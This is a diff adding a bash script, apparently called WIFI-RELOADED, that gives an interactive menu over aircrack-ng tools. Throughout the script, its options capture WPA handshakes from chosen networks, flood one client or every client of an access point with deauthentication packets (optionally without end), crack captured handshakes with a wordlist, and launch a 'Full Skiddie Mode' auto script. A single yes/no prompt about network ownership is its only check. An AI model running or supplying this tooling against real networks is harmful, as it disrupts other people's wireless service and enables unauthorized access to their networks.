@@ -1,0 +1,463 @@
+#!/bin/bash
+#Version: Alpha 3.0
+clear
+
+#Title
+figlet WIFI-RELOADED
+echo "--------------------------------------------------------------------------------"
+echo "|Made by BaconBombz|Hosted on GitHub|"
+echo "--------------------------------------------------------------------------------"
+
+#Not Taking Responsibility
+read -p "Are you doing this on your own network? [yes/no]: " safety
+clear
+
+#Listing Options
+figlet WIFI-RELOADED
+echo "--------------------------------------------------------------------------------"
+
+if [ $safety == yes ]
+then
+  cat<< END
+1) Start Monitor Mode
+2) Stop Monitor Mode
+3) Start Monitor Mode/Set Wireless Card To Monitor On a Specific Channel
+4) Monitor WiFi Networks
+5) Capture Handshake
+6) Send DeAuth Packets to 1 Device
+7) Send DeAuth Packets To ALL Devices
+8) Crack WiFi Password
+9 100% Full Auto
+0) Exit
+END
+echo "--------------------------------------------------------------------------------"
+read -p "Option: " Operation
+elif [ $safety == no ]
+then
+  echo "THEN NEVER TRY THIS."
+  sleep 1
+  exit
+else
+  echo "Hmm? Try Again."
+  sleep 1
+  exit
+fi
+
+#Operation 1
+if [ $Operation == 1 ]
+then
+  clear
+  figlet WIFI-RELOADED
+  echo "--------------------------------------------------------------------------------"
+  read -p "Start Monitor Mode? [yes/no]: " monstart
+  if [ $monstart == yes ]
+  then
+    clear
+    figlet WIFI-RELOADED
+    echo "--------------------------------------------------------------------------------"
+    echo "Interfaces: "
+    echo "--------------------------------------------------------------------------------"
+    airmon-ng
+    echo "--------------------------------------------------------------------------------"
+    read -p "What Interface Do You Want To Set As Monitor Mode? " monInterfacestart
+    clear
+    figlet WIFI-RELOADED
+    echo "--------------------------------------------------------------------------------"
+    airmon-ng start $monInterfacestart
+    echo "--------------------------------------------------------------------------------"
+    clear
+    figlet WIFI-RELOADED
+    echo "--------------------------------------------------------------------------------"
+    echo "Interfaces: "
+    echo "--------------------------------------------------------------------------------"
+    airmon-ng
+    echo "--------------------------------------------------------------------------------"
+    read -p "Go Back? [yes/no]: " back
+    if [ $back == yes ]
+    then
+      ./wifi-reloaded
+    fi
+  elif  [ $monstart == no ]
+  then
+    clear
+    figlet WIFI-RELOADED
+    echo "--------------------------------------------------------------------------------"
+    read -p "Go Back? [yes/no]: " back
+    if [ $back == yes ]
+    then
+      ./wifi-reloaded
+    fi
+  fi
+fi
+
+#Operation 2
+if [ $Operation == 2 ]
+then
+  clear
+  figlet WIFI-RELOADED
+  echo "--------------------------------------------------------------------------------"
+  read -p "Stop Monitor Mode? [yes/no]: " monstop
+  if [ $monstop == yes ]
+  then
+    clear
+    figlet WIFI-RELOADED
+    echo "--------------------------------------------------------------------------------"
+    echo "Interfaces: "
+    echo "--------------------------------------------------------------------------------"
+    airmon-ng
+    echo "--------------------------------------------------------------------------------"
+    read -p "What Interface Do You Want To Stop Being Monitor Mode? " monInterfacestop
+    clear
+    figlet WIFI-RELOADED
+    echo "--------------------------------------------------------------------------------"
+    airmon-ng stop $monInterfacestop
+    echo "--------------------------------------------------------------------------------"
+    clear
+    figlet WIFI-RELOADED
+    echo "--------------------------------------------------------------------------------"
+    echo "Interfaces: "
+    echo "--------------------------------------------------------------------------------"
+    airmon-ng
+    echo "--------------------------------------------------------------------------------"
+    read -p "Go Back? [yes/no]: " back
+    if [ $back == yes ]
+    then
+      ./wifi-reloaded
+    fi
+  elif  [ $monstop == no ]
+  then
+    clear
+    figlet WIFI-RELOADED
+    echo "--------------------------------------------------------------------------------"
+    read -p "Go Back? [yes/no]: " back
+    if [ $back == yes ]
+    then
+      ./wifi-reloaded
+    fi
+  fi
+fi
+
+#Operation 3
+if [ $Operation == 3 ]
+then
+  clear
+  figlet WIFI-RELOADED
+  echo "--------------------------------------------------------------------------------"
+  read -p "Start Monitor Mode/Set Wireless Card To Monitor On a Specific Channel?  [yes/no]: " monChannel
+  if [ $monChannel == yes ]
+  then
+    clear
+    figlet WIFI-RELOADED
+    echo "--------------------------------------------------------------------------------"
+    echo "Interfaces: "
+    echo "--------------------------------------------------------------------------------"
+    airmon-ng
+    echo "--------------------------------------------------------------------------------"
+    read -p "What Interface Do You Want To Set Monitor Mode/Set a Channel On? " monInterfaceChannel
+    clear
+    figlet WIFI-RELOADED
+    echo "--------------------------------------------------------------------------------"
+    read -p "What Channel Do You Want To Set Your Interface To? " monSetChannel
+    clear
+    figlet WIFI-RELOADED
+    echo "--------------------------------------------------------------------------------"
+    airmon-ng start $monInterfaceChannel $monSetChannel
+    clear
+    figlet WIFI-RELOADED
+    echo "--------------------------------------------------------------------------------"
+    read -p "Go Back? [yes/no]: " back
+    if [ $back == yes ]
+    then
+      ./wifi-reloaded
+    fi
+  elif  [ $monChannel == no ]
+  then
+    clear
+    figlet WIFI-RELOADED
+    echo "--------------------------------------------------------------------------------"
+    read -p "Go Back? [yes/no]: " back
+    if [ $back == yes ]
+    then
+      ./wifi-reloaded
+    fi
+  fi
+fi
+
+#Operation 4
+if [ $Operation == 4 ]
+then
+  clear
+  figlet WIFI-RELOADED
+  echo "--------------------------------------------------------------------------------"
+  read -p "Start Monitoring Networks Around You? [yes/no]: " monNet
+  if [ $monNet == yes ]
+  then
+    clear
+    figlet WIFI-RELOADED
+    echo "--------------------------------------------------------------------------------"
+    airmon-ng
+    echo "--------------------------------------------------------------------------------"
+    read -p "What is your Monitor Interface? " monInterfaceactive
+    clear
+    figlet WIFI-RELOADED
+    echo "--------------------------------------------------------------------------------"
+    echo "Press CTRL-C To Stop"
+    echo "3"
+    sleep 1
+    echo "2"
+    sleep 1
+    echo "1"
+    sleep 1
+    airodump-ng $monInterfaceactive
+    echo "--------------------------------------------------------------------------------"
+    read -p "Go Back? [yes/no]: " back
+    if [ $back == yes ]
+    then
+      ./wifi-reloaded
+    fi
+  elif  [ $monNet == no ]
+  then
+    clear
+    figlet WIFI-RELOADED
+    echo "--------------------------------------------------------------------------------"
+    read -p "Go Back? [yes/no]: " back
+    if [ $back == yes ]
+    then
+      ./wifi-reloaded
+    fi
+  fi
+fi
+
+#Operation 5
+if [ $Operation == 5 ]
+then
+  clear
+  figlet WIFI-RELOADED
+  echo "--------------------------------------------------------------------------------"
+  read -p "Capture Handshake? [yes/no]: " chstart
+  if [ $chstart == yes ]
+  then
+    clear
+    figlet WIFI-RELOADED
+    echo "--------------------------------------------------------------------------------"
+    read -p "What Is The Channel? " wfch
+    clear
+    figlet WIFI-RELOADED
+    echo "--------------------------------------------------------------------------------"
+    read -p "File Output Name: " fop
+    mkdir Handshakes/$fop
+    clear
+    figlet WIFI-RELOADED
+    echo "--------------------------------------------------------------------------------"
+    read -p "What Is The BSSID?: " bssidcap
+    clear
+    figlet WIFI-RELOADED
+    echo "--------------------------------------------------------------------------------"
+    airmon-ng
+    echo "--------------------------------------------------------------------------------"
+    read -p "What Is Your Monitor Interface? " monInterfacecap
+    clear
+    figlet WIFI-RELOADED
+    echo "--------------------------------------------------------------------------------"
+    echo "Press CTRL-C To Stop"
+    echo "3"
+    sleep 1
+    echo "2"
+    sleep 1
+    echo "1"
+    sleep 1
+    airodump-ng -c $wfch -w Handshakes/$fop/$fop --bssid $bssidcap $monInterfacecap
+    echo "--------------------------------------------------------------------------------"
+    echo "Handshake CAP File Saved To: WiFi-Reloaded/Handshakes/$fop/$fop-01.cap"
+    echo "--------------------------------------------------------------------------------"
+    read -p "Go Back? [yes/no]: " back
+    if [ $back == yes ]
+    then
+      ./wifi-reloaded
+    fi
+  elif  [ $chstart == no ]
+  then
+    clear
+    figlet WIFI-RELOADED
+    echo "--------------------------------------------------------------------------------"
+    read -p "Go Back? [yes/no]: " back
+    if [ $back == yes ]
+    then
+      ./wifi-reloaded
+    fi
+  fi
+fi
+
+#Operation 6
+if [ $Operation == 6 ]
+then
+  clear
+  figlet WIFI-RELOADED
+  echo "--------------------------------------------------------------------------------"
+  read -p "Send DeAuthentication Packets To 1 Device? [yes/no]: " sendDeAuthone
+  if [ $sendDeAuthone == yes ]
+  then
+    clear
+    figlet WIFI-RELOADED
+    echo "--------------------------------------------------------------------------------"
+    read -p "What Is The BSSID of The Network?: " DeAuthBSSIDone
+    clear
+    figlet WIFI-RELOADED
+    echo "--------------------------------------------------------------------------------"
+    read -p "What Is The Mac Address of The Target?: " DeAuthMAC
+    clear
+    figlet WIFI-RELOADED
+    echo "--------------------------------------------------------------------------------"
+    read -p "How Many Packets Do You Want To Send? [0 For Infinite] " hmDeAuthp
+    clear
+    figlet WIFI-RELOADED
+    echo "--------------------------------------------------------------------------------"
+    airmon-ng
+    echo "--------------------------------------------------------------------------------"
+    read -p "What Is Your Monitor Interface? " monInterfaceDeAuth
+    clear
+    figlet WIFI-RELOADED
+    echo "--------------------------------------------------------------------------------"
+    echo "Press CTRL-C To Stop"
+    echo "3"
+    sleep 1
+    echo "2"
+    sleep 1
+    echo "1"
+    sleep 1
+    clear
+    figlet WIFI-RELOADED
+    echo "--------------------------------------------------------------------------------"
+    aireplay-ng --deauth $hmDeAuthp -a $DeAuthBSSIDone -c $DeAuthMAC $monInterfaceDeAuth
+    echo "--------------------------------------------------------------------------------"
+    read -p "Go Back? [yes/no]: " back
+    if [ $back == yes ]
+    then
+      ./wifi-reloaded
+    fi
+  elif  [ $sendDeAuthone == no ]
+  then
+    clear
+    figlet WIFI-RELOADED
+    echo "--------------------------------------------------------------------------------"
+    read -p "Go Back? [yes/no]: " back
+    if [ $back == yes ]
+    then
+      ./wifi-reloaded
+    fi
+  fi
+fi
+
+#Operation 7
+if [ $Operation == 7 ]
+then
+  clear
+  figlet WIFI-RELOADED
+  echo "--------------------------------------------------------------------------------"
+  read -p "Send DeAuthentication Packets To ALL Devices? [yes/no]: " sendDeAuthall
+  if [ $sendDeAuthall == yes ]
+  then
+    clear
+    figlet WIFI-RELOADED
+    echo "--------------------------------------------------------------------------------"
+    read -p "What Is The BSSID of The Access Point?: " DeAuthBSSID
+    clear
+    figlet WIFI-RELOADED
+    echo "--------------------------------------------------------------------------------"
+    read -p "How Many Packets Do You Want To Send (0 For Infinite)? " hmDeAuthpall
+    clear
+    figlet WIFI-RELOADED
+    echo "--------------------------------------------------------------------------------"
+    airmon-ng
+    echo "--------------------------------------------------------------------------------"
+    read -p "What Is Your Monitor Interface? " monInterfaceDeAuth
+    clear
+    figlet WIFI-RELOADED
+    echo "--------------------------------------------------------------------------------"
+    echo "Press CTRL-C To Stop"
+    echo "3"
+    sleep 1
+    echo "2"
+    sleep 1
+    echo "1"
+    sleep 1
+    clear
+    figlet WIFI-RELOADED
+    echo "--------------------------------------------------------------------------------"
+    aireplay-ng -0 0$hmDeAuthpall -a $DeAuthBSSID $monInterfaceDeAuth
+    echo "--------------------------------------------------------------------------------"
+    read -p "Go Back? [yes/no]: " back
+    if [ $back == yes ]
+    then
+      ./wifi-reloaded
+    fi
+  elif  [ $sendDeAuthall == no ]
+  then
+    clear
+    figlet WIFI-RELOADED
+    echo "--------------------------------------------------------------------------------"
+    read -p "Go Back? [yes/no]: " back
+    if [ $back == yes ]
+    then
+      ./wifi-reloaded
+    fi
+  fi
+fi
+
+#Operation 8
+if [ $Operation == 8 ]
+then
+  clear
+  figlet WIFI-RELOADED
+  echo "--------------------------------------------------------------------------------"
+  read -p "Crack a Wireless Password with Aircrack-ng? [yes/no]" cpstart
+  if [ $cpstart == yes ]
+  then
+    clear
+    figlet WIFI-RELOADED
+    echo "--------------------------------------------------------------------------------"
+    read -p "Wordlist Path: " wrdList
+    clear
+    figlet WIFI-RELOADED
+    echo "--------------------------------------------------------------------------------"
+    read -p "Handshake CAP File Path: " hscFile
+    clear
+    figlet WIFI-RELOADED
+    echo "--------------------------------------------------------------------------------"
+    echo "Press CTRL-C To Stop"
+    echo "3"
+    sleep 1
+    echo "2"
+    sleep 1
+    echo "1"
+    sleep 1
+    aircrack-ng -w $wrdList $hscFile
+    echo "--------------------------------------------------------------------------------"
+    read -p "Go Back? [yes/no]: " back
+    if [ $back == yes ]
+    then
+      ./wifi-reloaded
+    fi
+  elif  [ $cpstart == no ]
+  then
+    clear
+    figlet WIFI-RELOADED
+    echo "--------------------------------------------------------------------------------"
+    read -p "Go Back? [yes/no]: " back
+    if [ $back == yes ]
+    then
+      ./wifi-reloaded
+    fi
+  fi
+fi
+
+#Full Auto
+if [ $Operation == 9 ]
+then
+  clear
+  figlet WIFI-RELOADED
+  echo "--------------------------------------------------------------------------------"
+  echo "Full Skiddie Mode Activating :-)"
+  sleep 1
+  ./Full-Auto
+fi
